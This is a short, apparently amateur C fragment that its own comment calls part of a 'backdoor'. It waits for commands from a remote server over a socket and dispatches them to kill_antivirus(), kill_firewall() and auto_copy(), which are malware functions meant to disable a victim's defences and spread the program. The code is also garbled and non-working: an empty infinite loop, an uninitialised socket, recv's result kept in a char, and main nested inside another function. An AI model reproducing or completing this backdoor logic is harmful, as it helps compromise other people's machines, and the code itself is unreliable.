/* this sequence must to be in the backdoor

 while(true), the char data will check if there's some data been transfered, 
 if don't, return to routine. 
 then will accept commands of server side. */ 

void execute()
{
    char data;   
    int sockfd;
    char buf[1024];
    
    while(true);

        data = recv(sockfd, buf, sizeof buf, 0);
        if(data == false)

        return;

             if(data == '1')
             {
                kill_antivirus();
             }
             else if(data == '2')
             {
                kill_firewall();
             }
             else if(data == '3')
             {
                auto_copy();    
             }
    
    int main()
    
    {
    
        execute();
       
        return;
                
    }


}
